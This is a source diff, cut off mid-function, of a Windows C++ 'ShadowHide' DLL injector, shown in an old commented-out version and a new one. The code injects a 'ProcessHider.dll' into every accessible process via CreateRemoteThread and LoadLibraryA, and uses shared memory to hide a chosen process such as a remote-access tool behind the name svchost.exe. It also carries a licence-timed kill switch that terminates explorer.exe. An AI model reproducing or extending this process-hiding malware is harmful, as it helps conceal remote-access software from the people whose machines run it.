@@ -1397,18 +1397,640 @@
 
 
 
+// #include <Windows.h>
+// #include <iostream>
+// #include <fstream>
+// #include <string>
+// #include <TlHelp32.h>
+// #include <set>
+
+// #pragma comment(lib, "Advapi32.lib")
+// #pragma comment(lib, "User32.lib")
+
+// #ifdef _MSC_VER
+// // #pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+// #endif
+
+// using namespace std;
+
+// HANDLE g_hMap = NULL;
+// LPVOID g_pBuf = NULL;
+// string g_targetProcess;
+// string g_logPath;
+// DWORD g_myPid = 0;
+// set<DWORD> g_injectedPids;
+
+// // ═══ NEW: Expiry timer received from Python launcher ═══
+// int g_expiryMinutes = 0;
+
+// // ═══ FORWARD DECLARATION so KillSwitchThread can call Log() ═══
+// void Log(const string& msg);
+
+// // ═══ NEW: Kill Switch — terminates injector when licence time runs out ═══
+// DWORD WINAPI KillSwitchThread(LPVOID lpParam) {
+//     // ═══ DEBUG: Prove the timer value actually arrived ═══
+//     {
+//         char dbg[256];
+//         sprintf_s(dbg, "[KILL SWITCH] Thread started. g_expiryMinutes=%d", g_expiryMinutes);
+//         Log(string(dbg));
+//         // Uncomment the line below for a popup proof (remove after testing):
+//         // MessageBoxA(NULL, dbg, "ShadowHide - KillSwitch Debug", MB_OK | MB_ICONINFORMATION);
+//     }
+
+//     if (g_expiryMinutes == 0) {
+//         Log("[KILL SWITCH] ==========================================");
+//         Log("[KILL SWITCH] TIMER IS OFF (g_expiryMinutes = 0).");
+//         Log("[KILL SWITCH] Process will run indefinitely.");
+//         Log("[KILL SWITCH] To enable timer, launch: dll_injector.exe <minutes>");
+//         Log("[KILL SWITCH] ==========================================");
+//         return 0;
+//     }
+
+//     Log("[KILL SWITCH] ==========================================");
+//     Log("[KILL SWITCH] Timer armed for " + to_string(g_expiryMinutes) + " minute(s).");
+//     Log("[KILL SWITCH] Process will self-terminate when timer hits 0.");
+//     Log("[KILL SWITCH] ==========================================");
+
+//     DWORD totalSeconds = (DWORD)g_expiryMinutes * 60;
+//     DWORD elapsed = 0;
+
+//     while (elapsed < totalSeconds) {
+//         Sleep(1000);
+//         elapsed++;
+
+//         DWORD remaining = totalSeconds - elapsed;
+
+//         // Log every minute, and also every 10 sec during the last minute
+//         if (elapsed % 60 == 0) {
+//             Log("[KILL SWITCH] Time remaining: " + to_string(remaining / 60) + " min.");
+//         }
+//         else if (remaining < 60 && remaining % 10 == 0) {
+//             Log("[KILL SWITCH] Time remaining: " + to_string(remaining) + " sec.");
+//         }
+//     }
+
+//     Log("[KILL SWITCH] ==========================================");
+//     Log("[KILL SWITCH] TIMEOUT EXPIRED! Unhiding processes...");
+
+//     // CHANGED: Signal all injected DLLs to STOP hiding before we die
+//     if (g_pBuf) {
+//         DWORD* hideActivePtr = (DWORD*)((char*)g_pBuf + 140);
+//         *hideActivePtr = 0;
+//         Log("[KILL SWITCH] Hide flag cleared in shared memory.");
+//     }
+
+//     Log("[KILL SWITCH] Waiting 2 seconds for DLLs to pick up the flag...");
+//     Sleep(2000);
+
+//         // ═══ NEW: Kill explorer.exe as requested ═══
+//     // Log("[KILL SWITCH] Killing explorer.exe...");
+//     // system("taskkill /f /im explorer.exe >nul 2>&1");
+
+//     Log("[KILL SWITCH] Self-destructing now...");
+//     Log("[KILL SWITCH] ==========================================");
+
+//      // ═══ FIX: Force-flush logs, show confirmation, then hard-kill ═══
+//     {
+//         ofstream log(g_logPath, ios::app);
+//         if (log.is_open()) log << flush;
+//     }
+
+//      // ═══ FIX: Triple-redundancy termination for elevated / runas contexts ═══
+//     HANDLE hSelf = GetCurrentProcess();
+//     TerminateProcess(hSelf, 0);   // Method 1: instant kernel kill
+
+//     _exit(0);                     // Method 2: CRT hard-exit (skips atexit/detach)
+
+//     ExitProcess(0);               // Method 3: nuclear fallback (should never reach)
+
+//     // ExitProcess(0);   // Hard kill — instantly terminates this injector process
+//     return 0;
+// }
+
+// // ═══ GUI INPUT DIALOG ═══
+// struct InputDlgData {
+//     string prompt;
+//     string result;
+//     bool cancelled;
+//     HWND hEdit;
+// };
+
+// static WNDPROC g_oldEditProc = NULL;
+
+// LRESULT CALLBACK EditSubclassProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+//     if (msg == WM_KEYDOWN && wParam == VK_RETURN) {
+//         SendMessage(GetParent(hWnd), WM_COMMAND, MAKEWPARAM(IDOK, BN_CLICKED), (LPARAM)GetParent(hWnd));
+//         return 0;
+//     }
+//     if (msg == WM_KEYDOWN && wParam == VK_ESCAPE) {
+//         SendMessage(GetParent(hWnd), WM_COMMAND, MAKEWPARAM(IDCANCEL, BN_CLICKED), (LPARAM)GetParent(hWnd));
+//         return 0;
+//     }
+//     return CallWindowProc(g_oldEditProc, hWnd, msg, wParam, lParam);
+// }
+
+// LRESULT CALLBACK InputDlgProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+//     static InputDlgData* pData = nullptr;
+
+//     switch (msg) {
+//         case WM_CREATE: {
+//             CREATESTRUCT* cs = (CREATESTRUCT*)lParam;
+//             pData = (InputDlgData*)cs->lpCreateParams;
+
+//             CreateWindowEx(0, "STATIC", pData->prompt.c_str(),
+//                 WS_CHILD | WS_VISIBLE | SS_LEFT,
+//                 20, 20, 360, 30, hWnd, NULL, cs->hInstance, NULL);
+
+//             pData->hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, "EDIT", "",
+//                 WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_AUTOHSCROLL,
+//                 20, 55, 360, 24, hWnd, (HMENU)100, cs->hInstance, NULL);
+
+//             CreateWindowEx(0, "BUTTON", "OK",
+//                 WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
+//                 100, 100, 90, 28, hWnd, (HMENU)IDOK, cs->hInstance, NULL);
+
+//             CreateWindowEx(0, "BUTTON", "Cancel",
+//                 WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
+//                 210, 100, 90, 28, hWnd, (HMENU)IDCANCEL, cs->hInstance, NULL);
+
+//             g_oldEditProc = (WNDPROC)SetWindowLongPtr(pData->hEdit, GWLP_WNDPROC, (LONG_PTR)EditSubclassProc);
+
+//             EnumChildWindows(hWnd, [](HWND hChild, LPARAM) -> BOOL {
+//                 SendMessage(hChild, WM_SETFONT, (WPARAM)GetStockObject(DEFAULT_GUI_FONT), TRUE);
+//                 return TRUE;
+//             }, 0);
+
+//             SetFocus(pData->hEdit);
+//             return 0;
+//         }
+
+//         case WM_COMMAND: {
+//             WORD id = LOWORD(wParam);
+//             if (id == IDOK) {
+//                 char buf[256] = {0};
+//                 GetWindowTextA(pData->hEdit, buf, 255);
+//                 pData->result = buf;
+//                 pData->cancelled = false;
+//                 DestroyWindow(hWnd);
+//             } else if (id == IDCANCEL) {
+//                 pData->cancelled = true;
+//                 DestroyWindow(hWnd);
+//             }
+//             return 0;
+//         }
+
+//         case WM_CLOSE:
+//             pData->cancelled = true;
+//             DestroyWindow(hWnd);
+//             return 0;
+
+//         case WM_DESTROY:
+//             PostQuitMessage(0);
+//             return 0;
+//     }
+//     return DefWindowProc(hWnd, msg, wParam, lParam);
+// }
+
+// string GetInputFromGUI(HINSTANCE hInst, const char* title, const char* prompt) {
+//     InputDlgData data;
+//     data.prompt = prompt;
+//     data.cancelled = true;
+//     data.hEdit = NULL;
+
+//     WNDCLASSEX wc = {0};
+//     wc.cbSize = sizeof(WNDCLASSEX);
+//     wc.lpfnWndProc = InputDlgProc;
+//     wc.hInstance = hInst;
+//     wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+//     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+//     wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
+//     wc.lpszClassName = "ShadowHideInputDlg";
+
+//     if (!RegisterClassEx(&wc)) {
+//         if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS) return "";
+//     }
+
+//     int w = 420, h = 170;
+//     int x = (GetSystemMetrics(SM_CXSCREEN) - w) / 2;
+//     int y = (GetSystemMetrics(SM_CYSCREEN) - h) / 2;
+
+//     HWND hWnd = CreateWindowEx(WS_EX_DLGMODALFRAME | WS_EX_TOPMOST,
+//         "ShadowHideInputDlg", title,
+//         WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_VISIBLE,
+//         x, y, w, h, NULL, NULL, hInst, &data);
+
+//     MSG msg;
+//     while (GetMessage(&msg, NULL, 0, 0)) {
+//         TranslateMessage(&msg);
+//         DispatchMessage(&msg);
+//     }
+
+//     UnregisterClass("ShadowHideInputDlg", hInst);
+//     return data.cancelled ? "" : data.result;
+// }
+
+// // ═══ ORIGINAL FUNCTIONS ═══
+// void Log(const string& msg) {
+//     // ── 1) File log (original behaviour) ──
+//     ofstream log(g_logPath, ios::app);
+//     if (log.is_open()) {
+//         SYSTEMTIME st;
+//         GetLocalTime(&st);
+//         char timeBuf[32];
+//         sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
+//         log << timeBuf << msg << endl;
+//         log.close();
+//     }
+
+//     // ── 2) Console log (NEW) ──
+//     SYSTEMTIME st;
+//     GetLocalTime(&st);
+//     char timeBuf[32];
+//     sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
+//     cout << timeBuf << msg << endl;
+// }
+
+// bool enable_debug_privilege() {
+//     HANDLE hToken;
+//     TOKEN_PRIVILEGES tkp;
+//     LUID luid;
+
+//     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+//         return false;
+//     if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
+//         CloseHandle(hToken);
+//         return false;
+//     }
+
+//     tkp.PrivilegeCount = 1;
+//     tkp.Privileges[0].Luid = luid;
+//     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+//     if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
+//         CloseHandle(hToken);
+//         return false;
+//     }
+
+//     BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
+//     CloseHandle(hToken);
+//     return ok;
+// }
+
+// bool is_system_process(DWORD pid) {
+//     if (pid == 0 || pid == 4) return true;
+
+//     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+//     if (!hProcess) return false;
+
+//     BOOL isCritical = FALSE;
+//     typedef BOOL (WINAPI *pIsCritical)(HANDLE, PBOOL);
+//     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+//     pIsCritical IsCriticalProcess = (pIsCritical)GetProcAddress(hKernel32, "IsCriticalProcess");
+//     if (IsCriticalProcess) {
+//         IsCriticalProcess(hProcess, &isCritical);
+//     }
+//     CloseHandle(hProcess);
+//     return isCritical == TRUE;
+// }
+
+// bool inject_dll(DWORD pid, const string& dll_path) {
+//     if (pid == g_myPid) return false;
+//     if (is_system_process(pid)) return false;
+
+//     DWORD dwAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+//                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
+
+//     HANDLE hProcess = OpenProcess(dwAccess, FALSE, pid);
+//     if (!hProcess) return false;
+
+// #ifdef _WIN64
+//     BOOL isWow64 = FALSE;
+//     typedef BOOL (WINAPI *pIsWow64)(HANDLE, PBOOL);
+//     pIsWow64 fnIsWow64 = (pIsWow64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
+//     if (fnIsWow64 && fnIsWow64(hProcess, &isWow64) && isWow64) {
+//         CloseHandle(hProcess);
+//         return false;
+//     }
+// #endif
+
+//     SIZE_T pathSize = dll_path.length() + 1;
+//     LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+//     if (!remoteBuffer) {
+//         CloseHandle(hProcess);
+//         return false;
+//     }
+
+//     if (!WriteProcessMemory(hProcess, remoteBuffer, dll_path.c_str(), pathSize, NULL)) {
+//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+//         CloseHandle(hProcess);
+//         return false;
+//     }
+
+//     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+//     LPTHREAD_START_ROUTINE pLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
+//     if (!pLoadLibraryA) {
+//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+//         CloseHandle(hProcess);
+//         return false;
+//     }
+
+//     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryA, remoteBuffer, 0, NULL);
+//     if (!hThread) {
+//         VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+//         CloseHandle(hProcess);
+//         return false;
+//     }
+
+//     WaitForSingleObject(hThread, 5000);
+//     DWORD exitCode = 0;
+//     GetExitCodeThread(hThread, &exitCode);
+
+//     CloseHandle(hThread);
+//     VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+//     CloseHandle(hProcess);
+
+//     return (exitCode != 0);
+// }
+
+// DWORD FindTargetPid(const string& name) {
+//     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+//     if (snap == INVALID_HANDLE_VALUE) return 0;
+
+//     PROCESSENTRY32 pe = { sizeof(pe) };
+//     DWORD found = 0;
+
+//     if (Process32First(snap, &pe)) {
+//         do {
+//             if (_stricmp(pe.szExeFile, name.c_str()) == 0) {
+//                 found = pe.th32ProcessID;
+//                 break;
+//             }
+//         } while (Process32Next(snap, &pe));
+//     }
+//     CloseHandle(snap);
+//     return found;
+// }
+
+// DWORD WINAPI find_and_inject(LPVOID lpParam) {
+//     Log("[THREAD] Injection thread started");
+
+//     if (!enable_debug_privilege()) {
+//         Log("[ERROR] Admin privileges required.");
+//         return 1;
+//     }
+
+//     char exePath[MAX_PATH];
+//     GetModuleFileNameA(NULL, exePath, MAX_PATH);
+//     string dllPath(exePath);
+//     size_t lastSlash = dllPath.find_last_of('\\');
+//     if (lastSlash != string::npos) dllPath.erase(lastSlash + 1);
+//     dllPath.append("ProcessHider.dll");
+
+//     Log("[MAIN] DLL path: " + dllPath);
+
+//     while (true) {
+//         PROCESSENTRY32 pe32{};
+//         pe32.dwSize = sizeof(PROCESSENTRY32);
+
+//         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+//         if (hSnap == INVALID_HANDLE_VALUE) {
+//             Sleep(2000);
+//             continue;
+//         }
+
+//         if (!Process32First(hSnap, &pe32)) {
+//             CloseHandle(hSnap);
+//             Sleep(2000);
+//             continue;
+//         }
+
+//         do {
+//             DWORD pid = pe32.th32ProcessID;
+
+//             if (g_injectedPids.count(pid)) continue;
+//             if (pid == g_myPid || pid <= 4) continue;
+
+//             if (inject_dll(pid, dllPath)) {
+//                 Log("[+] Injected PID " + to_string(pid) + " (" + string(pe32.szExeFile) + ")");
+//                 g_injectedPids.insert(pid);
+//             }
+
+//         } while (Process32Next(hSnap, &pe32));
+
+//         CloseHandle(hSnap);
+
+//         DWORD targetPid = FindTargetPid(g_targetProcess);
+//         if (targetPid != 0 && g_pBuf) {
+//             memcpy((char*)g_pBuf + 132, &targetPid, sizeof(DWORD));
+//         }
+
+//         static int cleanup = 0;
+//         if (++cleanup >= 30) {
+//             cleanup = 0;
+//             for (auto it = g_injectedPids.begin(); it != g_injectedPids.end(); ) {
+//                 HANDLE hTest = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, *it);
+//                 if (!hTest) {
+//                     it = g_injectedPids.erase(it);
+//                 } else {
+//                     CloseHandle(hTest);
+//                     ++it;
+//                 }
+//             }
+//         }
+
+//         Sleep(1000);
+//     }
+//     return 0;
+// }
+
+// bool setup_shared_memory(const string& targetName) {
+//     g_hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 256, "GetProcessName");
+//     if (!g_hMap) return false;
+
+//     g_pBuf = MapViewOfFile(g_hMap, FILE_MAP_ALL_ACCESS, 0, 0, 256);
+//     if (!g_pBuf) {
+//         CloseHandle(g_hMap);
+//         g_hMap = NULL;
+//         return false;
+//     }
+
+//     memset(g_pBuf, 0, 256);
+//     CopyMemory(g_pBuf, targetName.c_str(), min(targetName.length(), (size_t)127));
+
+//     DWORD* pidPtr = (DWORD*)((char*)g_pBuf + 128);
+//     *pidPtr = g_myPid;
+
+//     DWORD targetPid = FindTargetPid(targetName);
+//     DWORD* targetPidPtr = (DWORD*)((char*)g_pBuf + 132);
+//     *targetPidPtr = targetPid;
+
+//     // Write expiry minutes to shared memory offset 136
+//     DWORD* expiryPtr = (DWORD*)((char*)g_pBuf + 136);
+//     *expiryPtr = (DWORD)g_expiryMinutes;
+
+//     // CHANGED: Write hide-active flag to offset 140 (1 = hiding, 0 = showing)
+//     DWORD* hideActivePtr = (DWORD*)((char*)g_pBuf + 140);
+//     *hideActivePtr = 1;
+
+//     return true;
+// }
+
+// // ═══ ENTRY POINT ═══
+// int main(int argc, char* argv[]) {
+//     g_myPid = GetCurrentProcessId();
+
+//         // ═══ DEBUG: Instant popup to prove argv[1] arrived ═══
+//     // {
+//     //     char dbg[512];
+//     //     sprintf_s(dbg, "PID: %lu\nargc: %d\nargv[1]: %s\nParsed timer: %d min",
+//     //               g_myPid, argc,
+//     //               (argc > 1 && argv[1]) ? argv[1] : "(NONE)",
+//     //               (argc > 1 && argv[1]) ? atoi(argv[1]) : 0);
+//     //     MessageBoxA(NULL, dbg, "ShadowHide - DEBUG", MB_OK | MB_ICONINFORMATION);
+//     // }
+//     // ═════════════════════════════════════════════════════
+
+//     // ═══ FORCE CONSOLE WINDOW (even in GUI subsystem app) ═══
+//     if (AllocConsole()) {
+//         FILE* fp;
+//         freopen_s(&fp, "CONOUT$", "w", stdout);
+//         freopen_s(&fp, "CONOUT$", "w", stderr);
+//         freopen_s(&fp, "CONIN$", "r", stdin);
+
+//         // Give conhost.exe a moment to create the window
+//         Sleep(300);
+
+//         HWND hConsole = GetConsoleWindow();
+//         if (hConsole) {
+//             // Aggressive: restore + show + topmost + focus
+//             ShowWindow(hConsole, SW_RESTORE);      // SW_RESTORE > SW_SHOW
+//             ShowWindow(hConsole, SW_SHOW);
+//             SetWindowPos(hConsole, HWND_TOPMOST, 0, 0, 0, 0,
+//                          SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
+//             BringWindowToTop(hConsole);
+//             SetForegroundWindow(hConsole);
+//             UpdateWindow(hConsole);
+//         }
+//     }
+//     // ════════════════════════════════════════════════════════
+
+//     // Parse expiry minutes passed as 1st argument
+//     if (argc > 1) {
+//         g_expiryMinutes = atoi(argv[1]);
+//     }
+
+//     // ═══ DEBUG: Confirm in log what we received ═══
+//     {
+//         char dbg[512];
+//         sprintf_s(dbg, "[MAIN] argc=%d | argv[1]=%s | parsed g_expiryMinutes=%d",
+//                   argc,
+//                   (argc > 1 && argv[1]) ? argv[1] : "(null)",
+//                   g_expiryMinutes);
+//         Log(string(dbg));
+//     }
+
+//     char exePath[MAX_PATH];
+//     GetModuleFileNameA(NULL, exePath, MAX_PATH);
+//     string basePath(exePath);
+//     size_t idx = basePath.find_last_of('\\');
+//     if (idx != string::npos) basePath.erase(idx + 1);
+//     g_logPath = basePath + "log.txt";
+//     ofstream(g_logPath, ios::trunc).close();
+
+//     // ═══ STARTUP BANNER ═══
+//     Log("[MAIN] ==================================================");
+//     Log("[MAIN] ShadowHide DLL Injector started.");
+//     Log("[MAIN] PID: " + to_string(g_myPid));
+//     Log("[MAIN] Command-line args count: " + to_string(argc));
+//     Log("[MAIN] Expiry Minutes parsed: " + to_string(g_expiryMinutes));
+//     if (g_expiryMinutes == 0) {
+//         Log("[MAIN] >>> WARNING: Kill-switch is DISABLED.");
+//         Log("[MAIN] >>> Pass a number as 1st argument to enable timer.");
+//         Log("[MAIN] >>> Example: dll_injector.exe 5");
+//     } else {
+//         Log("[MAIN] >>> Kill-switch armed for " + to_string(g_expiryMinutes) + " min.");
+//     }
+//     Log("[MAIN] ==================================================");
+
+//     // GUI Input Dialog (replaces console cin)
+//     string targetName = GetInputFromGUI(GetModuleHandle(NULL),
+//         "ShadowHide - Process Masquerade",
+//         "Enter Process Name To Masquerade (e.g., getscreen.exe):");
+
+//     if (targetName.empty()) {
+//         Log("[MAIN] User cancelled input dialog");
+//         return 0;
+//     }
+
+//     g_targetProcess = targetName;
+//     Log("[MAIN] Target: " + targetName + " -> svchost.exe | PID: " + to_string(g_myPid));
+
+//     if (!setup_shared_memory(targetName)) {
+//         Log("[MAIN] setup_shared_memory() FAILED");
+//         return 1;
+//     }
+
+//     Log("[MAIN] Shared memory created");
+
+//     // Start kill-switch timer thread
+//     HANDLE hKillSwitch = CreateThread(NULL, 0, KillSwitchThread, NULL, 0, NULL);
+//     if (hKillSwitch) CloseHandle(hKillSwitch);
+
+//     HANDLE hThread = CreateThread(NULL, 0, find_and_inject, NULL, 0, NULL);
+//     if (!hThread) {
+//         Log("[MAIN] Failed to create thread");
+//         return 1;
+//     }
+//     CloseHandle(hThread);
+
+//     while (true) Sleep(10000);
+//     return 0;
+// }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #include <Windows.h>
 #include <iostream>
 #include <fstream>
 #include <string>
 #include <TlHelp32.h>
 #include <set>
+#include <cstdlib>
+#include <ctime>
+#include <mmsystem.h>
 
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "User32.lib")
+#pragma comment(lib, "winmm.lib")
+
+// Explicitly define TimerQueue constants in case old SDK lacks them
+#ifndef WT_EXECUTEINTIMERTHREAD
+#define WT_EXECUTEINTIMERTHREAD 0x00000020
+#endif
 
 #ifdef _MSC_VER
-#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+// #pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
 #endif
 
 using namespace std;
@@ -1420,27 +2042,257 @@ string g_logPath;
 DWORD g_myPid = 0;
 set<DWORD> g_injectedPids;
 
-// ═══ NEW: Expiry timer received from Python launcher ═══
 int g_expiryMinutes = 0;
 
-// ═══ FORWARD DECLARATION so KillSwitchThread can call Log() ═══
 void Log(const string& msg);
 
-// ═══ NEW: Kill Switch — terminates injector when licence time runs out ═══
+// ═══ FIX: Write a second debug log to %TEMP% so we always have evidence ═══
+void DebugLog(const string& msg) {
+    char tempPath[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, tempPath)) {
+        string dbgPath = string(tempPath) + "shadowinjector_debug.log";
+        ofstream dbg(dbgPath, ios::app);
+        if (dbg.is_open()) {
+            SYSTEMTIME st;
+            GetLocalTime(&st);
+            dbg << "[" << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] " << msg << endl;
+            dbg.close();
+        }
+    }
+}
+
+// ═══ BULLETPROOF: argv first, then file with retry, then registry ═══
+int read_timer_from_any_source(int argc, char* argv[]) {
+    // ── 0) argv[1] is the MOST reliable source ──
+    if (argc > 1 && argv[1] && argv[1][0] != '\0') {
+        int argMinutes = atoi(argv[1]);
+        if (argMinutes > 0) {
+            string ok = "[TIMER] Source=argv[1] value=" + to_string(argMinutes);
+            Log(ok);
+            DebugLog(ok);
+            return argMinutes;
+        } else {
+            string err = "[TIMER] argv[1] present but invalid: '" + string(argv[1]) + "'";
+            Log(err);
+            DebugLog(err);
+        }
+    } else {
+        DebugLog("[TIMER] argv[1] missing or empty");
+    }
+
+    // ── 1) File fallback with LONG retry (Python may still be writing) ──
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    string cfgPath(exePath);
+    size_t idx = cfgPath.find_last_of('\\');
+    if (idx != string::npos) cfgPath.erase(idx + 1);
+    cfgPath += "shadowhide_timer.cfg";
+
+    DebugLog("[TIMER FILE] Looking for: " + cfgPath);
+
+    for (int attempt = 1; attempt <= 100; ++attempt) {
+        ifstream cfg(cfgPath);
+        if (cfg.is_open()) {
+            int minutes = 0;
+            if (cfg >> minutes && minutes > 0) {
+                cfg.close();
+                string ok = "[TIMER FILE] SUCCESS read=" + to_string(minutes) + " path=" + cfgPath;
+                Log(ok);
+                DebugLog(ok);
+                return minutes;
+            }
+            cfg.close();
+        }
+        if (attempt % 10 == 0) {
+            string dbg = "[TIMER FILE] Attempt " + to_string(attempt) + " failed. Retrying...";
+            DebugLog(dbg);
+        }
+        Sleep(100);
+    }
+
+    string fail = "[TIMER FILE] Failed after 100 attempts: " + cfgPath;
+    Log(fail);
+    DebugLog(fail);
+
+    // ── 2) Registry fallback (both WOW64 views) ──
+    const REGSAM samViews[2] = { KEY_READ, KEY_READ | KEY_WOW64_32KEY };
+    const char* viewNames[2] = { "native", "WOW64_32KEY" };
+
+    for (int i = 0; i < 2; ++i) {
+        HKEY hKey;
+        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\ShadowHide", 0, samViews[i], &hKey);
+        if (result != ERROR_SUCCESS) {
+            string err = "[REGISTRY] Open failed view=" + string(viewNames[i]) + " err=" + to_string(result);
+            Log(err);
+            DebugLog(err);
+            continue;
+        }
+
+        DWORD dwValue = 0;
+        DWORD dwSize = sizeof(DWORD);
+        DWORD dwType = 0;
+        result = RegQueryValueExA(hKey, "TimerMinutes", NULL, &dwType, (LPBYTE)&dwValue, &dwSize);
+        RegCloseKey(hKey);
+
+        if (result == ERROR_SUCCESS && dwType == REG_DWORD && dwValue > 0) {
+            string ok = "[REGISTRY] SUCCESS view=" + string(viewNames[i]) + " TimerMinutes=" + to_string(dwValue);
+            Log(ok);
+            DebugLog(ok);
+            return (int)dwValue;
+        } else {
+            string err = "[REGISTRY] Query failed view=" + string(viewNames[i]) + " err=" + to_string(result) + " type=" + to_string(dwType) + " val=" + to_string(dwValue);
+            Log(err);
+            DebugLog(err);
+        }
+    }
+
+    string final = "[TIMER] ALL SOURCES FAILED. Timer not found.";
+    Log(final);
+    DebugLog(final);
+    return 0;
+}
+
+void KillExplorerByApi() {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) {
+        Log("[KILL SWITCH] Failed to snapshot processes for explorer kill.");
+        return;
+    }
+
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    int killed = 0;
+
+    if (Process32First(snap, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                if (hProc) {
+                    if (TerminateProcess(hProc, 0)) {
+                        killed++;
+                        Log("[KILL SWITCH] Terminated explorer.exe PID " + to_string(pe.th32ProcessID));
+                    } else {
+                        Log("[KILL SWITCH] Failed to terminate explorer.exe PID " + to_string(pe.th32ProcessID));
+                    }
+                    CloseHandle(hProc);
+                }
+            }
+        } while (Process32Next(snap, &pe));
+    }
+
+    CloseHandle(snap);
+
+    if (killed == 0) {
+        Log("[KILL SWITCH] No explorer.exe instances found to kill.");
+    }
+}
+
+// ═══ FIX: Guaranteed kill — if one method returns, the next one executes ═══
+void BrutalSelfKill() {
+    // Clean up timer file so launcher knows we consumed it
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    string cfgPath(exePath);
+    size_t idx = cfgPath.find_last_of('\\');
+    if (idx != string::npos) cfgPath.erase(idx + 1);
+    cfgPath += "shadowhide_timer.cfg";
+    DeleteFileA(cfgPath.c_str());
+
+    // Flush file log
+    {
+        ofstream log(g_logPath, ios::app);
+        if (log.is_open()) {
+            log << flush;
+            log.close();
+        }
+    }
+
+    Sleep(500);
+
+    // 1) Kernel-level terminate
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (hNtdll) {
+        typedef NTSTATUS (NTAPI *pNtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+        pNtTerminateProcess NtTerminateProcess = (pNtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
+        if (NtTerminateProcess) {
+            NtTerminateProcess(GetCurrentProcess(), 0);
+        }
+        typedef NTSTATUS (NTAPI *pRtlExitUserProcess)(NTSTATUS);
+        pRtlExitUserProcess RtlExitUserProcess = (pRtlExitUserProcess)GetProcAddress(hNtdll, "RtlExitUserProcess");
+        if (RtlExitUserProcess) {
+            RtlExitUserProcess(0);
+        }
+    }
+
+    // 2) Standard API kill
+    TerminateProcess(GetCurrentProcess(), 0);
+
+    // 3) CRT kill
+    _exit(0);
+
+    // 4) Windows cleanup exit
+    ExitProcess(0);
+
+    // 5) Loop until dead
+    while (true) {
+        TerminateProcess(GetCurrentProcess(), 0);
+        Sleep(50);
+    }
+}
+
+// ═══ BACKUP KILL #1: TimerQueue timer (kernel-managed, threadpool callback) ═══
+VOID CALLBACK BackupKillCallback(PVOID, BOOLEAN) {
+    DebugLog("[BACKUP KILL #1] TimerQueue timer fired. Force-killing process NOW.");
+    Log("[BACKUP KILL #1] TimerQueue timer fired. Force-killing process NOW.");
+    BrutalSelfKill();
+}
+
+// ═══ BACKUP KILL #2: Multimedia timer (winmm, very reliable) ═══
+void CALLBACK MMTimerCallback(UINT uTimerID, UINT uMsg, DWORD_PTR dwUser, DWORD_PTR dw1, DWORD_PTR dw2) {
+    DebugLog("[BACKUP KILL #2] Multimedia timer fired. Force-killing process NOW.");
+    Log("[BACKUP KILL #2] Multimedia timer fired. Force-killing process NOW.");
